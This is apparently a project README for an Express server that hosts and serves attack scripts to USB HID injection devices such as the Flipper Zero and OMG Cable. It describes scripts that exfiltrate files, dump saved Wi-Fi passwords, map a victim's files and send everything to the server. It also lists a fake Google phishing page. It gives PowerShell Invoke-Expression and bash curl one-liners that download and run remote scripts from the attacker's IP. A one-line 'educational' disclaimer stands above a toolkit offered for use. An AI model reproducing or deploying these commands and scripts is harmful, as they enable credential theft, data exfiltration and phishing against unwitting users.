# MacServerFace

Do you have an HID injection device? OMG Cable, ALOA, BADUsb, or Flipper 0? Then this server is for you. Instead of making custom scripts on each device or even your only device, use this server to host your own scripts and be able to receive data from the client running the scripts. For your HID or Ducky scripts change one word and have access to all scripts hosted on the server. I have a few scripts to get you going and a fake login page(for fun). Mac and Linux scripts coming soon.

## Disclaimer

This project is for educational purposes and not to be used maliciously. This is just for me to get a basic understanding of hosting and serving different file types and understanding the power of HID injection.

## Table of Contents

- [Disclaimer](#disclaimer)
- [Description](#description)
- [Installation](#installation)
- [Setup](#Setup)
- [Scripts](#Scripts)  
- [Execution](#Execution)

## Description

This is a simple Express Server that allows for scripts to be served and uploads sent to the server. It also allows you to access a collection of Powershell, Bash, Ducky, HID scripts and a fake pishing pages. This server includes scripts to launch other scripts or webpages from the server. Making it so that you can change one line of code in your script and give your HID device access to all the scripts on the server.

## Installation

in the directory you want to store the project run the command:

```bash
git clone https://github.com/Pmacdon15/MacServerFace
```

Next we will need to install the Node Modules, I will list the commands here:

```bash
cd ShenanigansMacServerFace
```

```bash
npm install
```

## Setup

For easy setup download and install Python if you haven't already.

### On Windows type this in to your browsers URL bar

```url
https://www.python.org/downloads/
```

or

### On Linux in the terminal

```bash
sudo apt-get update
sudo apt-get install python3
```

Then after navigating to the project folder in the terminal run: 

(on Windows)
```bash
py setup.py
```

(on Mac or linux)
```bash
python3 setup.py
```

This will allow you to enter a new Ip Address or localhost and automatically change all the Powershell, Ducky, HID scripts to reflect the entered Ip address.

Replace pickAServerName  with a you choice.

I recommend using Pm2 so that you can do other things on your terminal while running the server, like checking the capturedInfo folder after running a script on a client's computer.

Remember to apply appropriate port forwarding if accessing the server from outside the network.

## Scripts

### setup.py 

This script will update the url of all scripts, so that you can easily set the Ip address of your server. 

### exfiltrateFile(s).ps1

This Script will transfer file(s) With specified path and sends them to the server's uploads directory.

### infoGather.ps1

This script gathers computer name / username , Ip address, Os version and current Wlan profile and password. Then it makes a temporary file and sends it to the server, then deletes the file.

### launchVoice.ps1

This script simply plays a computer voice over the client's computer, It can be updated to say anything you wish.

### mapFiles.ps1

This script list all files and directories on the clients computer in the capturedInfo directory. Files are listed and saved to a file then to the server and deleted from the temporary folder.

### openWebPageFull.ps1

This script will open a weg page in MS Edge and full screen it. Useful for using the built in fake pishing pages.

### qrCode.ps1

This Downloads a Qr Code to the clients computer and opens it for them to see.

### ransom.ps1

This script is a bit of a joke, it plays a computer voice stating your files have been encrypted. Then a progress bar is displayed, then and error message, after clicking ok the computer will go to the lock screen and no harm will have been done.

### rickRoll.ps1

Fairly self explanatory opens Microsoft Edge full screens the video and it should play a rick roll.

### rickRollMac.sh

Rick Roll for Mac although I have not had time to test it yet.

### selfDestruct.ps1

This script is a prank with a count down and progress bar. Nothing happens the bar fills up and the program exits.

### wifiDump.ps1 

This script dumps all Wlan profiles on a clients computer with a clear Key and sends them to the server.

### wifiDumpMac.sh

This should dump all the Wlan profiles on the client's computer although I have not had time to test it yet.

## Execution

To start the server 

```bash
node server.js
```

or

### Installing pm2 is optional

(on linux)
```bash
npm install -g pm2
```

or if you installed pm2

```bash
pm2 start server.js --name pickAServerName
```

After the server is running you can manually call a script make sure ipaddress and scriptname are updated(ipaddress can be updated automatically with setup.py), then enter the above code in to PowerShell. The below code can be found in the powerShell folder file named launchPsScript.ps1

```powershell
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://<ipaddress>:3002/scripts/<scriptname>.ps1" -UseBasicParsing).Content))
```
or

```Bash
bash -c "$(curl -fsSL http://<ipaddress>:3002/<scriptName.sh>)"
```

Other wise you can use an HID injection device and uses one of the trigger scripts I have provided:

> [!NOTE]
> Make sure to run setup.py to update the server Ip address, as well as choosing a script name.

### DuckyScript 

1. launchPsScript.txt
2. launchPsScriptAdmin.txt

### HIDScript(ALOA)

1. launchPsScript.js
2. launchPsScriptAdmin.js

### Phishing site
1. http://<ipaddress>:3002/notGoogle




